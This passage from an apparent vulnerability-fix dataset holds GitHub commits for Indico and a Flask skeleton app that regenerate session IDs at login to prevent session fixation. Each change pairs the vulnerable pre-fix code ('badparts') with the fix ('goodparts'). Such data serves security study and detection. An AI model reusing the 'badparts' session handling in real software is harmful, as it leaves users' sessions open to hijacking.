      if self.get_cookie_secure(app) and not session.get('_secure'):\n+            return True\n+        if getattr(session, '_refresh_sid', False):\n+            return True\n+        return False\n \n     def open_session(self, app, request):\n         sid = request.cookies.get(app.session_cookie_name)\n","add":5,"remove":1,"filename":"\/indico\/web\/flask\/session.py","badparts":["        return self.get_cookie_secure(app) and not session.get('_secure')"],"goodparts":["        if self.get_cookie_secure(app) and not session.get('_secure'):","            return True","        if getattr(session, '_refresh_sid', False):","            return True","        return False"]}],"source":"\n from __future__ import absolute_import import cPickle import uuid from datetime import datetime, timedelta from flask import request, flash from flask.sessions import SessionInterface, SessionMixin from markupsafe import Markup from werkzeug.datastructures import CallbackDict from werkzeug.utils import cached_property from indico.core.config import Config from indico.modules.users import User from indico.util.decorators import cached_writable_property from indico.util.i18n import _ from MaKaC.common.cache import GenericCache class BaseSession(CallbackDict, SessionMixin): def __init__(self, initial=None, sid=None, new=False): def on_update(self): self.modified=True CallbackDict.__init__(self, initial, on_update) self.sid=sid self.new=new self.modified=False defaults=self._get_defaults() if defaults: self.update(defaults) def _get_defaults(self): return None class IndicoSession(BaseSession): @cached_writable_property('_user') def user(self): user_id=self.get('_user_id') user=User.get(user_id) if user_id is not None else None if user and user.is_deleted: merged_into_user=user.merged_into_user user=None if not request.is_xhr and request.blueprint !='assets': self.clear() if merged_into_user: msg=_(u'Your profile has been merged into <strong>{}<\/strong>. ' u'Please log in using that profile.') flash(Markup(msg).format(merged_into_user.full_name), 'warning') else: flash(_(u'Your profile has been deleted.'), 'error') return user @user.setter def user(self, user): if user is None: self.pop('_user_id', None) else: self['_user_id']=user.id @property def avatar(self): return self.user.as_avatar if self.user else None @property def lang(self): if '_lang' in self: return self['_lang'] elif self.user: return self.user.settings.get('lang') else: return None @lang.setter def lang(self, lang): self['_lang']=lang @cached_property def csrf_token(self): if '_csrf_token' not in self: self['_csrf_token']=str(uuid.uuid4()) return self['_csrf_token'] @property def csrf_protected(self): return self.user is not None @property def timezone(self): if '_timezone' in self: return self['_timezone'] if '_user_id' not in self: return 'LOCAL' return Config.getInstance().getDefaultTimezone() @timezone.setter def timezone(self, tz): self['_timezone']=tz class IndicoSessionInterface(SessionInterface): pickle_based=True serializer=cPickle session_class=IndicoSession temporary_session_lifetime=timedelta(days=7) def __init__(self): self.storage=GenericCache('flask-session') def generate_sid(self): return str(uuid.uuid4()) def get_cookie_secure(self, app): return request.is_secure def get_storage_lifetime(self, app, session): if session.permanent: return app.permanent_session_lifetime else: return self.temporary_session_lifetime def should_refresh_session(self, app, session): if session.new or '_expires' not in session: return False threshold=self.get_storage_lifetime(app, session) \/ 2 return session['_expires'] -datetime.now() < threshold def should_refresh_sid(self, app, session): return self.get_cookie_secure(app) and not session.get('_secure') def open_session(self, app, request): sid=request.cookies.get(app.session_cookie_name) if not sid: return self.session_class(sid=self.generate_sid(), new=True) data=self.storage.get(sid) if data is not None: return self.session_class(self.serializer.loads(data), sid=sid) return self.session_class(sid=self.generate_sid(), new=True) def save_session(self, app, session, response): domain=self.get_cookie_domain(app) secure=self.get_cookie_secure(app) refresh_sid=self.should_refresh_sid(app, session) if not session and not session.new: self.storage.delete(session.sid) response.delete_cookie(app.session_cookie_name, domain=domain) return if not refresh_sid and not session.modified and not self.should_refresh_session(app, session): return if app.config['INDICO_SESSION_PERMANENT']: session.permanent=True storage_ttl=self.get_storage_lifetime(app, session) cookie_lifetime=self.get_expiration_time(app, session) session['_expires']=datetime.now() +storage_ttl if refresh_sid: self.storage.delete(session.sid) session.sid=self.generate_sid() session['_secure']=request.is_secure self.storage.set(session.sid, self.serializer.dumps(dict(session)), storage_ttl) response.set_cookie(app.session_cookie_name, session.sid, expires=cookie_lifetime, httponly=True, secure=secure) ","sourceWithComments":"# This file is part of Indico.\n# Copyright (C) 2002 - 2015 European Organization for Nuclear Research (CERN).\n#\n# Indico is free software; you can redistribute it and\/or\n# modify it under the terms of the GNU General Public License as\n# published by the Free Software Foundation; either version 3 of the\n# License, or (at your option) any later version.\n#\n# Indico is distributed in the hope that it will be useful, but\n# WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Indico; if not, see <http:\/\/www.gnu.org\/licenses\/>.\n\nfrom __future__ import absolute_import\n\nimport cPickle\nimport uuid\nfrom datetime import datetime, timedelta\n\nfrom flask import request, flash\nfrom flask.sessions import SessionInterface, SessionMixin\nfrom markupsafe import Markup\nfrom werkzeug.datastructures import CallbackDict\nfrom werkzeug.utils import cached_property\n\nfrom indico.core.config import Config\nfrom indico.modules.users import User\nfrom indico.util.decorators import cached_writable_property\nfrom indico.util.i18n import _\nfrom MaKaC.common.cache import GenericCache\n\n\nclass BaseSession(CallbackDict, SessionMixin):\n    def __init__(self, initial=None, sid=None, new=False):\n        def on_update(self):\n            self.modified = True\n        CallbackDict.__init__(self, initial, on_update)\n        self.sid = sid\n        self.new = new\n        self.modified = False\n        defaults = self._get_defaults()\n        if defaults:\n            self.update(defaults)\n\n    def _get_defaults(self):\n        # Note: This is called before there is a DB connection available!\n        return None\n\n\n# Hey, if you intend on adding a custom property to this class:\n# - Only do it if you need logic behind it. Otherwise use the dict API!\n# - Even if you do need logic, keep it to core stuff. Otherwise it probably does not belong here!\n# - Always prefix the dict keys backing a property with an underscore (to prevent clashes with externally-set items)\n# - When you store something like the avatar that involves a DB lookup, use cached_writable_property\nclass IndicoSession(BaseSession):\n    @cached_writable_property('_user')\n    def user(self):\n        user_id = self.get('_user_id')\n        user = User.get(user_id) if user_id is not None else None\n        if user and user.is_deleted:\n            merged_into_user = user.merged_into_user\n            user = None\n            # If the user is deleted and the request is likely to be seen by\n            # the user, we forcefully log him out and inform him about it.\n            if not request.is_xhr and request.blueprint != 'assets':\n                self.clear()\n                if merged_into_user:\n                    msg = _(u'Your profile has been merged into <strong>{}<\/strong>. '\n                            u'Please log in using that profile.')\n                    flash(Markup(msg).format(merged_into_user.full_name), 'warning')\n                else:\n                    flash(_(u'Your profile has been deleted.'), 'error')\n        return user\n\n    @user.setter\n    def user(self, user):\n        if user is None:\n            self.pop('_user_id', None)\n        else:\n            self['_user_id'] = user.id\n\n    @property\n    def avatar(self):\n        return self.user.as_avatar if self.user else None\n\n    @property\n    def lang(self):\n        if '_lang' in self:\n            return self['_lang']\n        elif self.user:\n            return self.user.settings.get('lang')\n        else:\n            return None\n\n    @lang.setter\n    def lang(self, lang):\n        self['_lang'] = lang\n\n    @cached_property\n    def csrf_token(self):\n        if '_csrf_token' not in self:\n            self['_csrf_token'] = str(uuid.uuid4())\n        return self['_csrf_token']\n\n    @property\n    def csrf_protected(self):\n        return self.user is not None\n\n    @property\n    def timezone(self):\n        if '_timezone' in self:\n            return self['_timezone']\n        if '_user_id' not in self:\n            return 'LOCAL'\n        return Config.getInstance().getDefaultTimezone()\n\n    @timezone.setter\n    def timezone(self, tz):\n        self['_timezone'] = tz\n\n\nclass IndicoSessionInterface(SessionInterface):\n    pickle_based = True\n    serializer = cPickle\n    session_class = IndicoSession\n    temporary_session_lifetime = timedelta(days=7)\n\n    def __init__(self):\n        self.storage = GenericCache('flask-session')\n\n    def generate_sid(self):\n        return str(uuid.uuid4())\n\n    def get_cookie_secure(self, app):\n        return request.is_secure\n\n    def get_storage_lifetime(self, app, session):\n        # Permanent sessions are stored for exactly the same duration as the session id cookie.\n        # \"Temporary\" session are stored for a period that is not too short\/long as some people\n        # close their browser very rarely and thus shouldn't be logged out that often.\n        if session.permanent:\n            return app.permanent_session_lifetime\n        else:\n            return self.temporary_session_lifetime\n\n    def should_refresh_session(self, app, session):\n        if session.new or '_expires' not in session:\n            return False\n        threshold = self.get_storage_lifetime(app, session) \/ 2\n        return session['_expires'] - datetime.now() < threshold\n\n    def should_refresh_sid(self, app, session):\n        return self.get_cookie_secure(app) and not session.get('_secure')\n\n    def open_session(self, app, request):\n        sid = request.cookies.get(app.session_cookie_name)\n        if not sid:\n            return self.session_class(sid=self.generate_sid(), new=True)\n        data = self.storage.get(sid)\n        if data is not None:\n            return self.session_class(self.serializer.loads(data), sid=sid)\n        return self.session_class(sid=self.generate_sid(), new=True)\n\n    def save_session(self, app, session, response):\n        domain = self.get_cookie_domain(app)\n        secure = self.get_cookie_secure(app)\n        refresh_sid = self.should_refresh_sid(app, session)\n        if not session and not session.new:\n            # empty session, delete it from storage and cookie\n            self.storage.delete(session.sid)\n            response.delete_cookie(app.session_cookie_name, domain=domain)\n            return\n\n        if not refresh_sid and not session.modified and not self.should_refresh_session(app, session):\n            # If the session has not been modified we only store if it needs to be refreshed\n            return\n\n        if app.config['INDICO_SESSION_PERMANENT']:\n            # Setting session.permanent marks the session as modified so we only set it when we\n            # are saving the session anyway!\n            session.permanent = True\n\n        storage_ttl = self.get_storage_lifetime(app, session)\n        cookie_lifetime = self.get_expiration_time(app, session)\n        session['_expires'] = datetime.now() + storage_ttl\n\n        if refresh_sid:\n            self.storage.delete(session.sid)\n            session.sid = self.generate_sid()\n\n        session['_secure'] = request.is_secure\n        self.storage.set(session.sid, self.serializer.dumps(dict(session)), storage_ttl)\n        response.set_cookie(app.session_cookie_name, session.sid, expires=cookie_lifetime, httponly=True,\n                            secure=secure)\n"}},"msg":"Regenerate sid on login\/logout\n\nPrevents \"cookie tossing\" \/ session fixation"}},"https:\/\/github.com\/manikm\/indico2":{"f94958bcf8d5e23264ab5a0d257f6a637be64e7b":{"url":"https:\/\/api.github.com\/repos\/manikm\/indico2\/commits\/f94958bcf8d5e23264ab5a0d257f6a637be64e7b","html_url":"https:\/\/github.com\/manikm\/indico2\/commit\/f94958bcf8d5e23264ab5a0d257f6a637be64e7b","message":"Regenerate sid on login\/logout\n\nPrevents \"cookie tossing\" \/ session fixation","sha":"f94958bcf8d5e23264ab5a0d257f6a637be64e7b","keyword":"session fixation prevent","diff":"diff --git a\/indico\/web\/flask\/session.py b\/indico\/web\/flask\/session.py\nindex c0a89b047..62bf31c26 100644\n--- a\/indico\/web\/flask\/session.py\n+++ b\/indico\/web\/flask\/session.py\n@@ -81,6 +81,7 @@ def user(self, user):\n             self.pop('_user_id', None)\n         else:\n             self['_user_id'] = user.id\n+        self._refresh_sid = True\n \n     @property\n     def avatar(self):\n@@ -153,7 +154,11 @@ def should_refresh_session(self, app, session):\n         return session['_expires'] - datetime.now() < threshold\n \n     def should_refresh_sid(self, app, session):\n-        return self.get_cookie_secure(app) and not session.get('_secure')\n+        if self.get_cookie_secure(app) and not session.get('_secure'):\n+            return True\n+        if getattr(session, '_refresh_sid', False):\n+            return True\n+        return False\n \n     def open_session(self, app, request):\n         sid = request.cookies.get(app.session_cookie_name)\n","files":{"\/indico\/web\/flask\/session.py":{"changes":[{"diff":"\n         return session['_expires'] - datetime.now() < threshold\n \n     def should_refresh_sid(self, app, session):\n-        return self.get_cookie_secure(app) and not session.get('_secure')\n+        if self.get_cookie_secure(app) and not session.get('_secure'):\n+            return True\n+        if getattr(session, '_refresh_sid', False):\n+            return True\n+        return False\n \n     def open_session(self, app, request):\n         sid = request.cookies.get(app.session_cookie_name)\n","add":5,"remove":1,"filename":"\/indico\/web\/flask\/session.py","badparts":["        return self.get_cookie_secure(app) and not session.get('_secure')"],"goodparts":["        if self.get_cookie_secure(app) and not session.get('_secure'):","            return True","        if getattr(session, '_refresh_sid', False):","            return True","        return False"]},{"diff":"\n         return session['_expires'] - datetime.now() < threshold\n \n     def should_refresh_sid(self, app, session):\n-        return self.get_cookie_secure(app) and not session.get('_secure')\n+        if self.get_cookie_secure(app) and not session.get('_secure'):\n+            return True\n+        if getattr(session, '_refresh_sid', False):\n+            return True\n+        return False\n \n     def open_session(self, app, request):\n         sid = request.cookies.get(app.session_cookie_name)\n","add":5,"remove":1,"filename":"\/indico\/web\/flask\/session.py","badparts":["        return self.get_cookie_secure(app) and not session.get('_secure')"],"goodparts":["        if self.get_cookie_secure(app) and not session.get('_secure'):","            return True","        if getattr(session, '_refresh_sid', False):","            return True","        return False"]}],"source":"\n from __future__ import absolute_import import cPickle import uuid from datetime import datetime, timedelta from flask import request, flash from flask.sessions import SessionInterface, SessionMixin from markupsafe import Markup from werkzeug.datastructures import CallbackDict from werkzeug.utils import cached_property from indico.core.config import Config from indico.modules.users import User from indico.util.decorators import cached_writable_property from indico.util.i18n import _ from MaKaC.common.cache import GenericCache class BaseSession(CallbackDict, SessionMixin): def __init__(self, initial=None, sid=None, new=False): def on_update(self): self.modified=True CallbackDict.__init__(self, initial, on_update) self.sid=sid self.new=new self.modified=False defaults=self._get_defaults() if defaults: self.update(defaults) def _get_defaults(self): return None class IndicoSession(BaseSession): @cached_writable_property('_user') def user(self): user_id=self.get('_user_id') user=User.get(user_id) if user_id is not None else None if user and user.is_deleted: merged_into_user=user.merged_into_user user=None if not request.is_xhr and request.blueprint !='assets': self.clear() if merged_into_user: msg=_(u'Your profile has been merged into <strong>{}<\/strong>. ' u'Please log in using that profile.') flash(Markup(msg).format(merged_into_user.full_name), 'warning') else: flash(_(u'Your profile has been deleted.'), 'error') return user @user.setter def user(self, user): if user is None: self.pop('_user_id', None) else: self['_user_id']=user.id @property def avatar(self): return self.user.as_avatar if self.user else None @property def lang(self): if '_lang' in self: return self['_lang'] elif self.user: return self.user.settings.get('lang') else: return None @lang.setter def lang(self, lang): self['_lang']=lang @cached_property def csrf_token(self): if '_csrf_token' not in self: self['_csrf_token']=str(uuid.uuid4()) return self['_csrf_token'] @property def csrf_protected(self): return self.user is not None @property def timezone(self): if '_timezone' in self: return self['_timezone'] if '_user_id' not in self: return 'LOCAL' return Config.getInstance().getDefaultTimezone() @timezone.setter def timezone(self, tz): self['_timezone']=tz class IndicoSessionInterface(SessionInterface): pickle_based=True serializer=cPickle session_class=IndicoSession temporary_session_lifetime=timedelta(days=7) def __init__(self): self.storage=GenericCache('flask-session') def generate_sid(self): return str(uuid.uuid4()) def get_cookie_secure(self, app): return request.is_secure def get_storage_lifetime(self, app, session): if session.permanent: return app.permanent_session_lifetime else: return self.temporary_session_lifetime def should_refresh_session(self, app, session): if session.new or '_expires' not in session: return False threshold=self.get_storage_lifetime(app, session) \/ 2 return session['_expires'] -datetime.now() < threshold def should_refresh_sid(self, app, session): return self.get_cookie_secure(app) and not session.get('_secure') def open_session(self, app, request): sid=request.cookies.get(app.session_cookie_name) if not sid: return self.session_class(sid=self.generate_sid(), new=True) data=self.storage.get(sid) if data is not None: return self.session_class(self.serializer.loads(data), sid=sid) return self.session_class(sid=self.generate_sid(), new=True) def save_session(self, app, session, response): domain=self.get_cookie_domain(app) secure=self.get_cookie_secure(app) refresh_sid=self.should_refresh_sid(app, session) if not session and not session.new: self.storage.delete(session.sid) response.delete_cookie(app.session_cookie_name, domain=domain) return if not refresh_sid and not session.modified and not self.should_refresh_session(app, session): return if app.config['INDICO_SESSION_PERMANENT']: session.permanent=True storage_ttl=self.get_storage_lifetime(app, session) cookie_lifetime=self.get_expiration_time(app, session) session['_expires']=datetime.now() +storage_ttl if refresh_sid: self.storage.delete(session.sid) session.sid=self.generate_sid() session['_secure']=request.is_secure self.storage.set(session.sid, self.serializer.dumps(dict(session)), storage_ttl) response.set_cookie(app.session_cookie_name, session.sid, expires=cookie_lifetime, httponly=True, secure=secure) ","sourceWithComments":"# This file is part of Indico.\n# Copyright (C) 2002 - 2015 European Organization for Nuclear Research (CERN).\n#\n# Indico is free software; you can redistribute it and\/or\n# modify it under the terms of the GNU General Public License as\n# published by the Free Software Foundation; either version 3 of the\n# License, or (at your option) any later version.\n#\n# Indico is distributed in the hope that it will be useful, but\n# WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Indico; if not, see <http:\/\/www.gnu.org\/licenses\/>.\n\nfrom __future__ import absolute_import\n\nimport cPickle\nimport uuid\nfrom datetime import datetime, timedelta\n\nfrom flask import request, flash\nfrom flask.sessions import SessionInterface, SessionMixin\nfrom markupsafe import Markup\nfrom werkzeug.datastructures import CallbackDict\nfrom werkzeug.utils import cached_property\n\nfrom indico.core.config import Config\nfrom indico.modules.users import User\nfrom indico.util.decorators import cached_writable_property\nfrom indico.util.i18n import _\nfrom MaKaC.common.cache import GenericCache\n\n\nclass BaseSession(CallbackDict, SessionMixin):\n    def __init__(self, initial=None, sid=None, new=False):\n        def on_update(self):\n            self.modified = True\n        CallbackDict.__init__(self, initial, on_update)\n        self.sid = sid\n        self.new = new\n        self.modified = False\n        defaults = self._get_defaults()\n        if defaults:\n            self.update(defaults)\n\n    def _get_defaults(self):\n        # Note: This is called before there is a DB connection available!\n        return None\n\n\n# Hey, if you intend on adding a custom property to this class:\n# - Only do it if you need logic behind it. Otherwise use the dict API!\n# - Even if you do need logic, keep it to core stuff. Otherwise it probably does not belong here!\n# - Always prefix the dict keys backing a property with an underscore (to prevent clashes with externally-set items)\n# - When you store something like the avatar that involves a DB lookup, use cached_writable_property\nclass IndicoSession(BaseSession):\n    @cached_writable_property('_user')\n    def user(self):\n        user_id = self.get('_user_id')\n        user = User.get(user_id) if user_id is not None else None\n        if user and user.is_deleted:\n            merged_into_user = user.merged_into_user\n            user = None\n            # If the user is deleted and the request is likely to be seen by\n            # the user, we forcefully log him out and inform him about it.\n            if not request.is_xhr and request.blueprint != 'assets':\n                self.clear()\n                if merged_into_user:\n                    msg = _(u'Your profile has been merged into <strong>{}<\/strong>. '\n                            u'Please log in using that profile.')\n                    flash(Markup(msg).format(merged_into_user.full_name), 'warning')\n                else:\n                    flash(_(u'Your profile has been deleted.'), 'error')\n        return user\n\n    @user.setter\n    def user(self, user):\n        if user is None:\n            self.pop('_user_id', None)\n        else:\n            self['_user_id'] = user.id\n\n    @property\n    def avatar(self):\n        return self.user.as_avatar if self.user else None\n\n    @property\n    def lang(self):\n        if '_lang' in self:\n            return self['_lang']\n        elif self.user:\n            return self.user.settings.get('lang')\n        else:\n            return None\n\n    @lang.setter\n    def lang(self, lang):\n        self['_lang'] = lang\n\n    @cached_property\n    def csrf_token(self):\n        if '_csrf_token' not in self:\n            self['_csrf_token'] = str(uuid.uuid4())\n        return self['_csrf_token']\n\n    @property\n    def csrf_protected(self):\n        return self.user is not None\n\n    @property\n    def timezone(self):\n        if '_timezone' in self:\n            return self['_timezone']\n        if '_user_id' not in self:\n            return 'LOCAL'\n        return Config.getInstance().getDefaultTimezone()\n\n    @timezone.setter\n    def timezone(self, tz):\n        self['_timezone'] = tz\n\n\nclass IndicoSessionInterface(SessionInterface):\n    pickle_based = True\n    serializer = cPickle\n    session_class = IndicoSession\n    temporary_session_lifetime = timedelta(days=7)\n\n    def __init__(self):\n        self.storage = GenericCache('flask-session')\n\n    def generate_sid(self):\n        return str(uuid.uuid4())\n\n    def get_cookie_secure(self, app):\n        return request.is_secure\n\n    def get_storage_lifetime(self, app, session):\n        # Permanent sessions are stored for exactly the same duration as the session id cookie.\n        # \"Temporary\" session are stored for a period that is not too short\/long as some people\n        # close their browser very rarely and thus shouldn't be logged out that often.\n        if session.permanent:\n            return app.permanent_session_lifetime\n        else:\n            return self.temporary_session_lifetime\n\n    def should_refresh_session(self, app, session):\n        if session.new or '_expires' not in session:\n            return False\n        threshold = self.get_storage_lifetime(app, session) \/ 2\n        return session['_expires'] - datetime.now() < threshold\n\n    def should_refresh_sid(self, app, session):\n        return self.get_cookie_secure(app) and not session.get('_secure')\n\n    def open_session(self, app, request):\n        sid = request.cookies.get(app.session_cookie_name)\n        if not sid:\n            return self.session_class(sid=self.generate_sid(), new=True)\n        data = self.storage.get(sid)\n        if data is not None:\n            return self.session_class(self.serializer.loads(data), sid=sid)\n        return self.session_class(sid=self.generate_sid(), new=True)\n\n    def save_session(self, app, session, response):\n        domain = self.get_cookie_domain(app)\n        secure = self.get_cookie_secure(app)\n        refresh_sid = self.should_refresh_sid(app, session)\n        if not session and not session.new:\n            # empty session, delete it from storage and cookie\n            self.storage.delete(session.sid)\n            response.delete_cookie(app.session_cookie_name, domain=domain)\n            return\n\n        if not refresh_sid and not session.modified and not self.should_refresh_session(app, session):\n            # If the session has not been modified we only store if it needs to be refreshed\n            return\n\n        if app.config['INDICO_SESSION_PERMANENT']:\n            # Setting session.permanent marks the session as modified so we only set it when we\n            # are saving the session anyway!\n            session.permanent = True\n\n        storage_ttl = self.get_storage_lifetime(app, session)\n        cookie_lifetime = self.get_expiration_time(app, session)\n        session['_expires'] = datetime.now() + storage_ttl\n\n        if refresh_sid:\n            self.storage.delete(session.sid)\n            session.sid = self.generate_sid()\n\n        session['_secure'] = request.is_secure\n        self.storage.set(session.sid, self.serializer.dumps(dict(session)), storage_ttl)\n        response.set_cookie(app.session_cookie_name, session.sid, expires=cookie_lifetime, httponly=True,\n                            secure=secure)\n"}},"msg":"Regenerate sid on login\/logout\n\nPrevents \"cookie tossing\" \/ session fixation"}},"https:\/\/github.com\/sean-\/flask-skeleton":{"f0e102a1e7d69dcb8a2eb8093c40324503aeb8a0":{"url":"https:\/\/api.github.com\/repos\/sean-\/flask-skeleton\/commits\/f0e102a1e7d69dcb8a2eb8093c40324503aeb8a0","html_url":"https:\/\/github.com\/sean-\/flask-skeleton\/commit\/f0e102a1e7d69dcb8a2eb8093c40324503aeb8a0","message":"aaa.login now generates a new session ID to prevent possible fixation attacks.\n\nSigned-off-by: Sean Chittenden <sean@chittenden.org>","sha":"f0e102a1e7d69dcb8a2eb8093c40324503aeb8a0","keyword":"session fixation prevent","diff":"diff --git a\/skeleton\/modules\/aaa\/views.py b\/skeleton\/modules\/aaa\/views.py\nindex 2ab56db..7dc772a 100644\n--- a\/skeleton\/modules\/aaa\/views.py\n+++ b\/skeleton\/modules\/aaa\/views.py\n@@ -43,6 +43,14 @@ def login():\n         else:\n             flask.abort(500)\n \n+        # Generate a new session ID upon login. If someone steals my session\n+        # id, I want to explicitly prevent its use as a way of inject\n+        # unauthenticated session information in to an authenticated\n+        # session. In the future once pgmemcache has been hooked up to the\n+        # database, the old session id will be expired from memcache\n+        # automatically.\n+        new_sess_id = gen_session_id()\n+\n         ses = db.session\n         result = ses.execute(\n             # SELECT result, \"column\", message FROM aaa.login(email := 'user@example.com', password := '\\xbd\\x18\\xee\\x85\\x9f\\x19Bl\\x1e\\x9dE\\\\xdc\\x10\\xe2NH\\x1b\\x94\\xe5n\\x01C\\x98\\xe5AQ\\x05\\xb2\\xa7,\\x1co', ip_address := '11.22.33.44', session_id := 'user session id from flask', renewal_interval := '60 minutes'::INTERVAL) AS (result BOOL, \"column\" TEXT, message TEXT);\n@@ -51,7 +59,7 @@ def login():\n                     bindparam('email', form.email.data),\n                     bindparam('pw', shapass, type_=LargeBinary),\n                     bindparam('ip', remote_addr),\n-                    bindparam('sid', session['i']),\n+                    bindparam('sid', new_sess_id),\n                     bindparam('idle',idle)]))\n \n         # Explicitly commit regardless of the remaining logic. The database\n@@ -62,6 +70,7 @@ def login():\n         ses.commit()\n         row = result.first()\n         if row[0] == True:\n+            session['i'] = new_sess_id\n             session['li'] = True\n             flash('Successfully logged in as %s' % (form.email.data))\n             return redirect(url_for('home.index'))\n","files":{"\/skeleton\/modules\/aaa\/views.py":{"changes":[{"diff":"\n                     bindparam('email', form.email.data),\n                     bindparam('pw', shapass, type_=LargeBinary),\n                     bindparam('ip', remote_addr),\n-                    bindparam('sid', session['i']),\n+                    bindparam('sid', new_sess_id),\n                     bindparam('idle',idle)]))\n \n         # Explicitly commit regardless of the remaining logic. The database\n","add":1,"remove":1,"filename":"\/skeleton\/modules\/aaa\/views.py","badparts":["                    bindparam('sid', session['i']),"],"goodparts":["                    bindparam('sid', new_sess_id),"]},{"diff":"\n                     bindparam('email', form.email.data),\n                     bindparam('pw', shapass, type_=LargeBinary),\n                     bindparam('ip', remote_addr),\n-                    bindparam('sid', session['i']),\n+                    bindparam('sid', new_sess_id),\n                     bindparam('idle',idle)]))\n \n         # Explicitly commit regardless of the remaining logic. The database\n","add":1,"remove":1,"filename":"\/skeleton\/modules\/aaa\/views.py","badparts":["                    bindparam('sid', session['i']),"],"goodparts":["                    bindparam('sid', new_sess_id),"]}],"source":"\n\nimport base64, hashlib, M2Crypto from flask import current_app, flash, redirect, render_template, request, session, url_for from sqlalchemy.sql.expression import bindparam, text from sqlalchemy.types import LargeBinary from skeleton import db from aaa.forms import LoginForm, RegisterForm from aaa import module def gen_session_id(): \"\"\" Generates a session ID \"\"\" return base64.b32encode(M2Crypto.m2.rand_bytes(current_app.config['SESSION_BYTES'])) @module.route('\/login', methods=('GET','POST')) def login(): form=LoginForm() if not session.has_key('i'): session['i']=gen_session_id() if form.validate_on_submit(): remote_addr=request.environ['REMOTE_ADDR'] h=hashlib.new('sha256') h.update(current_app.config['PASSWORD_HASH']) h.update(form.password.data) shapass=h.digest() idle='1 second' if form.idle_ttl.data=='tmp': idle='20 minutes' elif form.idle_ttl.data=='day': idle='1 day' elif form.idle_ttl.data=='week': idle='1 week' else: flask.abort(500) ses=db.session result=ses.execute( text(\"SELECT ret, col, msg FROM aaa.login(:email,:pw,:ip,:sid,:idle) AS(ret BOOL, col TEXT, msg TEXT)\", bindparams=[ bindparam('email', form.email.data), bindparam('pw', shapass, type_=LargeBinary), bindparam('ip', remote_addr), bindparam('sid', session['i']), bindparam('idle',idle)])) ses.commit() row=result.first() if row[0]==True: session['li']=True flash('Successfully logged in as %s' %(form.email.data)) return redirect(url_for('home.index')) else: session.pop('li', None) try: field=form.__getattribute__(row[1]) if field.name=='vague': form.errors['EPERM']='There is no intro(2) error code for web errors' pass else: field.errors.append(row[2]) except AttributeError as e: pass return render_template('aaa\/login.html', form=form) @module.route('\/logout') def logout(): for k in session.keys(): session.pop(k) flash('You were logged out') return render_template('aaa\/logout.html') @module.route('\/register', methods=('GET','POST')) def register(): form=RegisterForm() if not session.has_key('i'): session['i']=gen_session_id() if form.validate_on_submit(): remote_addr=request.environ['REMOTE_ADDR'] h=hashlib.new('sha256') h.update(current_app.config['PASSWORD_HASH']) h.update(form.password.data) shapass=h.digest() ses=db.session result=ses.execute( text(\"SELECT ret, col, msg FROM aaa.register(:email,:pw,:ip) AS(ret BOOL, col TEXT, msg TEXT)\", bindparams=[ bindparam('email', form.email.data), bindparam('pw', shapass, type_=LargeBinary), bindparam('ip', remote_addr)])) row=result.first() if row[0]==True: ses.commit() flash('Thanks for registering! Please check your %s email account to confirm your email address.' %(form.email.data)) return redirect(url_for('aaa.login')) else: try: field=form.__getattribute__(row[1]) field.errors.append(row[2]) except AttributeError as e: pass return render_template('aaa\/register.html', form=form) ","sourceWithComments":"# -*- coding: utf-8 -*-\nimport base64, hashlib, M2Crypto\n\nfrom flask import current_app, flash, redirect, render_template, request, session, url_for\nfrom sqlalchemy.sql.expression import bindparam, text\nfrom sqlalchemy.types import LargeBinary\n\nfrom skeleton import db\nfrom aaa.forms import LoginForm, RegisterForm\nfrom aaa import module\n\ndef gen_session_id():\n    \"\"\" Generates a session ID \"\"\"\n    # Be kind to future support people and developers by using a base32\n    # encoded session id. Why is this cool? Read RFC3548 \u00a75 and rejoice\n    # at the lack of ambiguity regarding \"one\", \"ell\", \"zero\" and\n    # \"ohh\". You can thank me later.\n    return base64.b32encode(M2Crypto.m2.rand_bytes(current_app.config['SESSION_BYTES']))\n\n@module.route('\/login', methods=('GET','POST'))\ndef login():\n    form = LoginForm()\n    if not session.has_key('i'):\n        session['i'] = gen_session_id()\n\n    if form.validate_on_submit():\n        remote_addr = request.environ['REMOTE_ADDR']\n\n        # Hash the password once here:\n        h = hashlib.new('sha256')\n        h.update(current_app.config['PASSWORD_HASH'])\n        h.update(form.password.data)\n        shapass = h.digest()\n\n        # Change out the values of the session ttl\n        idle = '1 second'\n        if form.idle_ttl.data == 'tmp':\n            idle = '20 minutes'\n        elif form.idle_ttl.data == 'day':\n            idle = '1 day'\n        elif form.idle_ttl.data == 'week':\n            idle = '1 week'\n        else:\n            flask.abort(500)\n\n        ses = db.session\n        result = ses.execute(\n            # SELECT result, \"column\", message FROM aaa.login(email := 'user@example.com', password := '\\xbd\\x18\\xee\\x85\\x9f\\x19Bl\\x1e\\x9dE\\\\xdc\\x10\\xe2NH\\x1b\\x94\\xe5n\\x01C\\x98\\xe5AQ\\x05\\xb2\\xa7,\\x1co', ip_address := '11.22.33.44', session_id := 'user session id from flask', renewal_interval := '60 minutes'::INTERVAL) AS (result BOOL, \"column\" TEXT, message TEXT);\n            text(\"SELECT ret, col, msg FROM aaa.login(:email, :pw, :ip, :sid, :idle) AS (ret BOOL, col TEXT, msg TEXT)\",\n                 bindparams=[\n                    bindparam('email', form.email.data),\n                    bindparam('pw', shapass, type_=LargeBinary),\n                    bindparam('ip', remote_addr),\n                    bindparam('sid', session['i']),\n                    bindparam('idle',idle)]))\n\n        # Explicitly commit regardless of the remaining logic. The database\n        # did the right thing behind the closed doors of aaa.login() and we\n        # need to make sure that the logging to shadow.aaa_login_attempts is\n        # COMMIT'ed so that customer support can help the poor, frustrated\n        # (stupid?) users.\n        ses.commit()\n        row = result.first()\n        if row[0] == True:\n            session['li'] = True\n            flash('Successfully logged in as %s' % (form.email.data))\n            return redirect(url_for('home.index'))\n        else:\n            session.pop('li', None)\n            # Return a useful error message from the database\n            try:\n                # If the database says be vague, we'll be vague in our error\n                # messages. When the database commands it we obey, got it?\n                field = form.__getattribute__(row[1])\n                if field.name == 'vague':\n                    # Set bogus data so that 'form.errors == True'. If brute\n                    # force weren't such an issue, we'd just append a field\n                    # error like below. If you want to get the specifics of\n                    # why the database rejected a user, temporarily change\n                    # the above 'vague' to something that the database\n                    # doesn't return, such as 'EDRAT' or something equally\n                    # POSIXly funny.\n          